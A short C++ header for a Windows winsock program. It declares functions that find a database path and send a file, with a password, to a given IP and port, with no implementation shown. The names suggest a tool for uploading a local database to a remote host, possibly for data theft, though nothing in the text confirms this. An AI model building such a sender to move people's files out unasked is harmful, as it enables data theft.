#pragma once
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <stdio.h>
#include <winsock2.h>
#include <iostream>
#include <windows.h>

#pragma comment(lib,"ws2_32.lib")
#define  MAX_DATA_BLOCK_SIZE 8192

int winStartUp();
void getPath(unsigned char *dbpath);
void send_file(const char* file_name, const char* pass, const char* ip, u_short port);